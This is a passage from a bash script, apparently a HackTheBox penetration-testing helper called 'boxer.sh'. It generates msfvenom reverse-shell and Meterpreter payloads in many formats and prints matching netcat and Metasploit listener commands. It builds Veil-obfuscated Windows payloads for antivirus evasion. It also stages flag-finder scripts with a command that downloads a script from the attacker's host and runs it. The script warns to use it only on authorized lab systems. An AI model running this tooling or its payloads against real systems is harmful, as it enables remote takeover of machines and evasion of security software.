    case "$seen" in *"|$f|"*) continue ;; esac
    seen="${seen}|$f|"; found=$((found+1))
    printf '\n[+] %s\n' "$f"
    if content="$(cat "$f" 2>/dev/null)"; then printf '    %s\n' "$content"
    else printf '    <found but not readable as current user - check permissions/privesc>\n'; fi
  done < <(find "$root" -xdev -type f \( "${name_expr[@]}" \) 2>/dev/null)
done
echo
[[ $found -eq 0 ]] && echo "[-] No flag files found." || echo "[*] Done - $found flag file(s) found."
SH
  chmod +x "$dest/find-flags.sh" 2>/dev/null || true

  # Windows variant.
  cat > "$dest/find-flags.ps1" <<'PS'
# find-flags.ps1 — locate HTB flag files (user.txt/root.txt) on a Windows target.
# Authorized testing only. Usage: powershell -ep bypass -f find-flags.ps1 [-Roots C:\Users,C:\]
param([string[]]$Roots = @('C:\Users','C:\'))
$flagNames = @('user.txt','root.txt','proof.txt')
Write-Host "[*] find-flags: searching for $($flagNames -join ', ')"
$found = 0
$seen  = New-Object System.Collections.Generic.HashSet[string]
foreach ($root in $Roots) {
  if (-not (Test-Path $root)) { continue }
  Get-ChildItem -Path $root -Recurse -Include $flagNames -File -Force -ErrorAction SilentlyContinue |
    ForEach-Object {
      if ($seen.Add($_.FullName)) {
        $found++
        Write-Host "`n[+] $($_.FullName)"
        try { (Get-Content -LiteralPath $_.FullName -ErrorAction Stop) | ForEach-Object { Write-Host "    $_" } }
        catch { Write-Host "    <found but not readable as current user - check permissions/privesc>" }
      }
    }
}
Write-Host ""
if ($found -eq 0) { Write-Host "[-] No flag files found." } else { Write-Host "[*] Done - $found flag file(s) found." }
PS

  c_ok "Flag-finder scripts staged in: $dest"
  c_info "  Linux:   $dest/find-flags.sh"
  c_info "  Windows: $dest/find-flags.ps1"
  echo
  c_info "Deliver them (e.g. ./boxer.sh ftp $dest), then run ON the box:"
  cat <<EOF
    # Linux target:
    wget ftp://<YOUR-IP>/find-flags.sh -O /tmp/ff.sh && bash /tmp/ff.sh
    # Windows target:
    powershell -ep bypass -f find-flags.ps1
EOF
  return 0
}

# ---------------------------------------------------------------------------
# gen_veil — produce a Veil-obfuscated Windows payload (AV-evasion learning)
# ---------------------------------------------------------------------------
# Veil is a standard, publicly packaged pentest framework. This just invokes its
# CLI; it writes no obfuscation logic itself. Veil is Windows-exe focused and its
# setup is heavy (Wine/Go/Python via 'veil --setup'). Note: HTB target boxes have
# no AV, so this is mainly for learning how obfuscation works. Authorized use only.
gen_veil() {
  local base="$1" lhost="$2" lport="$3" dest="$4"
  local vpayload="${VEIL_PAYLOAD:-go/meterpreter/rev_tcp}"
  local name="htb_${base//[^A-Za-z0-9_]/_}"
  local vbin=""
  local c; for c in veil veil-evasion Veil.py; do have "$c" && { vbin="$c"; break; }; done

  echo
  c_info "Veil (obfuscated) variant:"
  c_info "Command:  ${vbin:-veil} -t Evasion -p $vpayload --ip $lhost --port $lport -o $name"
  if [[ -z "$vbin" ]]; then
    c_warn "Veil not installed — command shown above."
    c_info "Install:  sudo apt install -y veil && veil --setup   (heavy: pulls Wine/Go/Python)"
    return 0
  fi
  if [[ "$lhost" == "<LHOST>" ]]; then c_warn "LHOST not set — skipping Veil generation."; return 0; fi

  c_info "Generating with Veil (this can take a while)..."
  if ! "$vbin" -t Evasion -p "$vpayload" --ip "$lhost" --port "$lport" -o "$name" >/dev/null 2>&1; then
    c_warn "Veil generation failed — is it fully set up? Try 'veil --setup'."
    return 0
  fi
  # Locate the compiled artifact across the Veil output dirs used by different versions.
  local found
  found="$(find /var/lib/veil/output/compiled "$HOME/.veil/output/compiled" /usr/share/veil-output/compiled 2>/dev/null -iname "${name}.*" | head -n1 || true)"
  if [[ -n "$found" ]]; then
    cp "$found" "$dest/${base}-veil.${found##*.}" \
      && c_ok "Veil payload: $dest/${base}-veil.${found##*.}"
  else
    c_warn "Veil ran but output not found — check /var/lib/veil/output/compiled/ (or ~/.veil/output/compiled/)."
  fi
  c_info "Veil payload is meterpreter ($vpayload) — start a handler:"
  cat <<EOF
    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set ExitOnSession false; exploit -j"
EOF
  return 0
}

# ---------------------------------------------------------------------------
# shell — suggest + generate reverse-shell payloads with msfvenom (+ optional Veil)
# ---------------------------------------------------------------------------
# Generates a payload into the delivery folder (default ~/htb/serve) and prints
# the matching listener. LHOST auto-detects (tun0 else primary IP); override with
# $LHOST / $LPORT or the 2nd/3rd args. Prints the exact msfvenom command whether
# or not msfvenom is installed, so it's still useful as a cheat sheet.
# 4th arg or $SHELL_VEIL=1 also emits a Veil-obfuscated variant (Windows only):
# the msfvenom file is named '<base>-msf.<ext>' and the Veil one '<base>-veil.exe'.
cmd_shell() {
  local type="${1:-}"; local lhost="${2:-${LHOST:-}}"; local lport="${3:-${LPORT:-4444}}"
  local veil_opt="${4:-${SHELL_VEIL:-0}}"
  local dest="${SHELL_OUT:-$HTB_ROOT/serve}"
  mkdir -p "$dest"

  # Auto-detect LHOST if not supplied.
  if [[ -z "$lhost" ]]; then
    lhost="$(ip -4 addr show tun0 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -n1 || true)"
    [[ -z "$lhost" ]] && lhost="$(hostname -I 2>/dev/null | awk '{print $1}' || true)"
  fi
  [[ -z "$lhost" ]] && lhost="<LHOST>"

  # Resolve the request into a target/format (fmttype) and a shell kind
  # (kind = shell | meterpreter). Direct keywords still work for CLI use.
  local fmttype="" kind="shell"
  if [[ -n "$type" ]]; then
    case "$type" in
      windows-exe)     fmttype=win-exe;  kind=shell ;;
      windows-met)     fmttype=win-exe;  kind=meterpreter ;;
      aspx)            fmttype=win-aspx; kind=shell ;;
      aspx-met)        fmttype=win-aspx; kind=meterpreter ;;
      powershell|psh)  fmttype=win-psh;  kind=shell ;;
      powershell-met)  fmttype=win-psh;  kind=meterpreter ;;
      linux-elf)       fmttype=lin-elf;  kind=shell ;;
      linux-met)       fmttype=lin-elf;  kind=meterpreter ;;
      php)             fmttype=php;      kind=shell ;;
      php-met)         fmttype=php;      kind=meterpreter ;;
      war)             fmttype=war;      kind=shell ;;
      war-met)         fmttype=war;      kind=meterpreter ;;
      python)          fmttype=python;   kind=shell ;;
      python-met)      fmttype=python;   kind=meterpreter ;;
      bash)            fmttype=bash;     kind=shell ;;
      *) c_err "Unknown payload type: '$type'"; c_info "Run './boxer.sh shell' for the picker."; return 0 ;;
    esac
  else
    # Step 1: choose the target / output format.
    printf '\n\033[1;36m== msfvenom payload / shell generator ==\033[0m\n'
    cat <<'EOF'
  Choose target / format:
    1) Windows executable (.exe, x64)
    2) Windows ASPX (for IIS/web uploads)
    3) Windows PowerShell (.ps1)
    4) Linux executable (.elf, x64)
    5) PHP (.php)
    6) JSP / WAR (Tomcat)
    7) Python (.py)
    8) Bash one-liner (.sh)
EOF
    local sel; ask sel "Choose 1-8: "
    case "${sel:-}" in
      1) fmttype=win-exe ;; 2) fmttype=win-aspx ;; 3) fmttype=win-psh ;; 4) fmttype=lin-elf ;;
      5) fmttype=php ;; 6) fmttype=war ;; 7) fmttype=python ;; 8) fmttype=bash ;;
      *) c_err "Invalid choice."; return 0 ;;
    esac

    # Step 2: choose which KIND of shell (bash payload only supports a plain shell).
    if [[ "$fmttype" == "bash" ]]; then
      kind=shell
      c_info "Bash payload only supports a plain command shell."
    else
      printf '\n  Which kind of shell?\n    1) Command shell   (raw OS shell, catch with netcat)\n    2) Meterpreter     (Metasploit session, catch with multi/handler)\n'
      local ks; ask ks "Choose 1-2 [1]: "
      case "${ks:-1}" in
        2|met|meterpreter) kind=meterpreter ;;
        *) kind=shell ;;
      esac
    fi

    # Offer a Veil-obfuscated variant for Windows formats.
    if [[ "$fmttype" == win-* ]]; then
      local vsel; ask vsel "Also generate a Veil-obfuscated variant? [y/N]: "
      [[ "$vsel" =~ ^[Yy] ]] && veil_opt=1
    fi
  fi

  # Map (fmttype:kind) -> msfvenom payload / format / filename / listener.
  local payload fmt outfile listener="nc" note=""
  case "${fmttype}:${kind}" in
    win-exe:shell)        payload="windows/x64/shell_reverse_tcp";       fmt=exe;  outfile="shell-win-x64.exe" ;;
    win-exe:meterpreter)  payload="windows/x64/meterpreter/reverse_tcp"; fmt=exe;  outfile="met-win-x64.exe";      listener="msf" ;;
    win-aspx:shell)       payload="windows/x64/shell_reverse_tcp";       fmt=aspx; outfile="shell.aspx" ;;
    win-aspx:meterpreter) payload="windows/x64/meterpreter/reverse_tcp"; fmt=aspx; outfile="met.aspx";            listener="msf" ;;
    win-psh:shell)        payload="windows/x64/shell_reverse_tcp";       fmt=psh;  outfile="shell.ps1" ;;
    win-psh:meterpreter)  payload="windows/x64/meterpreter/reverse_tcp"; fmt=psh;  outfile="met.ps1";             listener="msf" ;;
    lin-elf:shell)        payload="linux/x64/shell_reverse_tcp";         fmt=elf;  outfile="shell-linux-x64.elf" ;;
    lin-elf:meterpreter)  payload="linux/x64/meterpreter/reverse_tcp";   fmt=elf;  outfile="met-linux-x64.elf";    listener="msf" ;;
    php:shell)            payload="php/reverse_php";                     fmt=raw;  outfile="shell.php"; note="If it doesn't run, ensure it starts with '<?php'." ;;
    php:meterpreter)      payload="php/meterpreter/reverse_tcp";         fmt=raw;  outfile="met.php";   listener="msf"; note="If it doesn't run, ensure it starts with '<?php'." ;;
    war:shell)            payload="java/jsp_shell_reverse_tcp";          fmt=war;  outfile="shell.war" ;;
    war:meterpreter)      payload="java/meterpreter/reverse_tcp";        fmt=war;  outfile="met.war";              listener="msf" ;;
    python:shell)         payload="python/shell_reverse_tcp";            fmt=raw;  outfile="shell.py" ;;
    python:meterpreter)   payload="python/meterpreter/reverse_tcp";      fmt=raw;  outfile="met.py";               listener="msf" ;;
    bash:shell)           payload="cmd/unix/reverse_bash";               fmt=raw;  outfile="shell.sh" ;;
    *) c_err "Unsupported combination: $fmttype / $kind"; return 0 ;;
  esac

  # Is this a Windows exe-style payload (the only kind Veil obfuscates)?
  local is_windows=0
  [[ "$fmttype" == win-* ]] && is_windows=1
  if [[ "$veil_opt" == "1" && "$is_windows" != "1" ]]; then
    c_warn "Veil variant is Windows-exe only — skipping it for '$type'."
    veil_opt=0
  fi

  # When also making a Veil variant, tag the msfvenom output with '-msf' so the
  # two payloads are clearly distinguished (Veil one is '<base>-veil.exe').
  local base_noext="${outfile%.*}" ext="${outfile##*.}"
  if [[ "$veil_opt" == "1" ]]; then outfile="${base_noext}-msf.${ext}"; fi

  # Build the invocation as an array (no eval — avoids issues with metachars).
  local args=(-p "$payload" "LHOST=$lhost" "LPORT=$lport" -f "$fmt" -o "$dest/$outfile")
  echo
  c_warn "Only deliver payloads to systems you are authorized to test (HTB / your own)."
  c_info "Payload:  $payload"
  c_info "Command:  msfvenom ${args[*]}"

  if [[ "$lhost" == "<LHOST>" ]]; then
    c_warn "LHOST not detected (no tun0/host IP). Re-run with it explicitly:"
    c_info "   ./boxer.sh shell $type <your-ip> $lport"
  elif have msfvenom; then
    c_info "Generating..."
    if msfvenom "${args[@]}"; then
      [[ "$fmt" == "raw" && "$outfile" == *.sh ]] && chmod +x "$dest/$outfile" 2>/dev/null || true
      c_ok "Payload written: $dest/$outfile"
    else
      c_warn "msfvenom failed — check the payload/options above."
      return 0
    fi
  else
    c_warn "msfvenom not found — copy the command above to generate it (install metasploit-framework)."
  fi

  [[ -n "$note" ]] && c_info "Note: $note"
  echo
  c_info "Then start your listener BEFORE triggering the payload:"
  if [[ "$listener" == "msf" ]]; then
    cat <<EOF
    msfconsole -q -x "use exploit/multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; set ExitOnSession false; exploit -j"
EOF
  else
    cat <<EOF
    # simple netcat listener (works with the stageless shells above):
    nc -lvnp $lport
    # (rlwrap nc -lvnp $lport  for a nicer shell with history)
EOF
  fi
  # Optional second payload: Veil-obfuscated variant (Windows only).
  if [[ "$veil_opt" == "1" ]]; then
    gen_veil "$base_noext" "$lhost" "$lport" "$dest"
  fi

  echo
  c_info "Deliver it to the box, e.g.:  ./boxer.sh ftp $dest"
  [[ "$veil_opt" == "1" ]] && c_info "You now have TWO payloads: ${base_noext}-msf.${ext} (plain) and ${base_noext}-veil.exe (obfuscated)."
  return 0
}

# ---------------------------------------------------------------------------
# vpn — connect to an HTB .ovpn profile
# ---------------------------------------------------------------------------
cmd_vpn() {
  local ovpn="${1:-}"
  if [[ -z "$ovpn" || ! -f "$ovpn" ]]; then c_err "Usage: $0 vpn /path/to/lab.ovpn"; exit 1; fi
  if ! have openvpn; then c_err "openvpn not installed. Run './boxer.sh install'."; exit 1; fi
  need_root
  c_info "Connecting to HTB VPN via $ovpn (Ctrl-C to disconnect)..."
  c_info "Your HTB tun IP will appear once connected; check with: ip a show tun0"
  exec $SUDO openvpn --config "$ovpn"
}

# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

# Small prompt helper: ask "$2..." into the variable named "$1" (won't abort on EOF).
ask() { local __v="$1"; shift; read -r -p "$(printf '\033[1;34m[?]\033[0m %s' "$*")" "$__v" || true; }

# ---------------------------------------------------------------------------
# menu — interactive "what next?" guide (default when run with no arguments)
# ---------------------------------------------------------------------------
cmd_menu() {
  # Boxer wordmark (green), shown once on entry.
  printf '\033[1;32m\n'
  cat <<'EOF'
 ____
| __ )  _____  _____ _ __
|  _ \ / _ \ \/ / _ \ '__|
| |_) | (_) >  <  __/ |
|____/ \___/_/\_\___|_|
EOF
  printf '\033[0m'
  while true; do
    printf '\n\033[1;36m==== boxer — what would you like to do? ====\033[0m\n'
    cat <<'EOF'
  Setup
    1) Install / update toolset (apt, SecLists, AutoRecon, PEASS-ng, RootHound, ...)
    2) Pull extra Git tools (from tools.txt or a URL)
    3) Download winPEAS/linPEAS binaries (for delivery)
    4) Verify tools are installed (doctor)
    5) Connect to HTB VPN (.ovpn)

  Attack a box
    6) New box workspace  (prompts name + IP, adds /etc/hosts, offers AutoRecon)
    7) Run recon on a box (nmap sweep + service scan + light enum)
    8) Scan web attack surface (uploads / logins / POST forms)
    9) Hunt for secrets (creds / tokens / keys in pages, JS, headers)
   10) Match fingerprinted services to known exploits (searchsploit)
   11) Web vulnerability scan (nikto + nuclei + sqlmap)

  Post-exploitation
   12) Start a file-delivery server (HTTP or anonymous FTP)
   13) Watch for linPEAS uploads -> auto privesc graph (RootHound)
   14) Generate reverse-shell payload (msfvenom)
   15) Stage flag-finder scripts (user.txt/root.txt, Linux + Windows)

    h) Full help / command reference
    0) Quit
EOF
    # Read the choice; exit cleanly on EOF (e.g. piped/closed stdin) to avoid a loop.
    local choice
    if ! read -r -p "$(printf '\033[1;34m[?]\033[0m Select an option: ')" choice; then
      echo; c_info "No more input — exiting menu."; return 0
    fi
    echo
    # Announce the selected action before running it, so the user always sees
    # what's starting before any results appear.
    local __label
    case "${choice:-}" in
      1)  __label="Install / update toolset" ;;
      2)  __label="Pull extra Git tools" ;;
      3)  __label="Download winPEAS/linPEAS binaries" ;;
      4)  __label="Verify installed tools (doctor)" ;;
      5)  __label="Connect to HTB VPN" ;;
      6)  __label="Create a new box workspace" ;;
      7)  __label="Run recon on a box" ;;
      8)  __label="Scan web attack surface" ;;
      9)  __label="Hunt for secrets" ;;
      10) __label="Match services to known exploits" ;;
      11) __label="Web vulnerability scan (nikto + nuclei + sqlmap)" ;;
      12) __label="Start a file-delivery server" ;;
      13) __label="Watch for linPEAS uploads (RootHound)" ;;
      14) __label="Generate a reverse-shell payload" ;;
      15) __label="Stage flag-finder scripts" ;;
      *)  __label="" ;;
    esac
    [[ -n "$__label" ]] && c_info "▶ Running: ${__label}"

    case "${choice:-}" in
      1) cmd_install ;;
      2) local u; ask u "Git URL (blank = use tools.txt): "; cmd_tools ${u:+"$u"} ;;
      3) cmd_peass ;;
      4) cmd_doctor ;;
      5) local f; ask f "Path to .ovpn file: "; [[ -n "${f:-}" ]] && cmd_vpn "$f" || c_warn "No file given." ;;
      6) cmd_workspace ;;   # prompts for name + IP itself
      7) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_recon "${ip:-}" "${box:-target}" ;;
      8) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_websurface "${ip:-}" "${box:-target}" ;;
      9) local ip box; ask ip "Target IP: "; ask box "Box name: "; cmd_secrets "${ip:-}" "${box:-target}" ;;
      10) local box; ask box "Box name: "; cmd_exploits "${box:-target}" ;;
      11) local ip box; ask ip "Target IP or URL: "; ask box "Box name: "; cmd_webscan "${ip:-}" "${box:-target}" ;;
      12) local proto d p b w
         ask proto "Which server?  1) HTTP (best if FTP is blocked)   2) anonymous FTP   [1]: "
         ask d "Directory to serve [~/htb/serve]: "
         ask b "Bind (auto / all / eth0 / tun0 / IP) [auto]: "
         case "${proto:-1}" in
           2|ftp|FTP)
             ask p "Port [21]: "
             ask w "Allow uploads from the box? [y/N]: "
             [[ "${w:-n}" =~ ^[Yy] ]] && export FTP_WRITE=1
             cmd_ftp "${d:-}" "${p:-21}" "${b:-auto}" ;;
           *)
             ask p "Port [80]: "
             cmd_http "${d:-}" "${p:-80}" "${b:-auto}" ;;
         esac ;;   # exec's the server (ends the menu)
      13) local b; ask b "Box name (blank = watch ALL boxes): "; cmd_roothound ${b:+"$b"} ;;
      14) cmd_shell ;;
      15) cmd_flags ;;
      h|H|help) usage ;;
      0|q|Q|quit|exit) c_info "Good hunting."; return 0 ;;
      "") : ;;   # empty input -> redraw
      *) c_warn "Not an option: ${choice}" ;;
    esac
    # Note: exec-based actions (VPN, FTP server) replace the process, so this
    # only prints for actions that return to the menu.
    [[ -n "$__label" ]] && c_info "✔ Finished: ${__label} — returning to menu."
  done
}

usage() {
  cat <<EOF
boxer.sh — HackTheBox host helper (Ubuntu/Debian)

Commands:
  menu                          Interactive next-steps menu (default when run with no args)
  install                       Install core pentest toolset
  tools [git-url…]              Clone + auto-install tools (from args or \$TOOLS_LIST)
  peass [dir]                   Download latest precompiled winPEAS/linPEAS binaries
  doctor                        Verify tools are installed
  workspace [box] [ip]          Scaffold ~/htb/<box> with notes + templates
                                (prompts for box name and IP if omitted)
  recon <ip> [box]              nmap sweep + service scan + light web/SMB enum
  websurface <ip> [box]         Flag exploitable web input methods (uploads/logins/POST)
  secrets <ip> [box]            Crawl + scan responses/JS/headers for creds/tokens/keys
  exploits <box>                Match fingerprinted services to known exploits (searchsploit)
  webscan <ip-or-url> [box]     Web vulnerability scan: nikto + nuclei + sqlmap
                                Covers the same ground as Burp Suite's active scanner.
                                nikto: server misconfigs; nuclei: CVE/exposure templates
                                (auto-selects by detected tech stack); sqlmap: SQLi (prompted).
  roothound [box|file]          Auto-run RootHound on uploaded linPEAS output.
                                No arg = watch ALL boxes' loot/ dirs; or name a
                                box, or pass a linPEAS file for a one-shot run.
  ftp [dir] [port] [bind]       Anonymous FTP server to deliver tools to the box
                                (default ~/htb/serve:21; bind=auto|all|<iface>|<ip>;
                                 FTP_BIND sets bind; FTP_WRITE=1 allows uploads)
  http [dir] [port] [bind]      Simple HTTP file server (use when FTP is blocked)
                                (default ~/htb/serve:80; bind=auto|all|<iface>|<ip>)
  shell [type] [lhost] [lport] [veil]
                                Generate a reverse-shell payload with msfvenom
                                (no type = picker; LHOST auto, LPORT 4444).
                                4th arg / SHELL_VEIL=1 also emits a Veil-obfuscated
                                Windows variant (files tagged -msf / -veil).
  flags [dir]                   Stage user.txt/root.txt finder scripts (Linux + Windows)
  vpn <file.ovpn>               Connect to an HTB VPN profile

Environment:
  HTB_ROOT   Base workspace dir (default: \$HOME/htb)

Only test systems you are authorized to (HTB labs / your own).
EOF
}

main() {
  local cmd="${1:-}"; shift || true
  case "$cmd" in
    install)   cmd_install "$@" ;;
    tools)     cmd_tools "$@" ;;
    peass)     cmd_peass "$@" ;;
    doctor)    cmd_doctor "$@" ;;
    workspace) cmd_workspace "$@" ;;
    recon)     cmd_recon "$@" ;;
    websurface) cmd_websurface "$@" ;;
    secrets)   cmd_secrets "$@" ;;
    exploits)  cmd_exploits "$@" ;;
    webscan)   cmd_webscan "$@" ;;
    roothound) cmd_roothound "$@" ;;
    ftp)       cmd_ftp "$@" ;;
    http)      cmd_http "$@" ;;
    shell|payload) cmd_shell "$@" ;;
    flags)     cmd_flags "$@" ;;
    vpn)       cmd_vpn "$@" ;;
    menu)      cmd_menu ;;
    "")        cmd_menu ;;
    -h|--help|help) usage ;;
    *) c_err "Unknown command: $cmd"; usage; exit 1 ;;
  esac
}

main "$@"
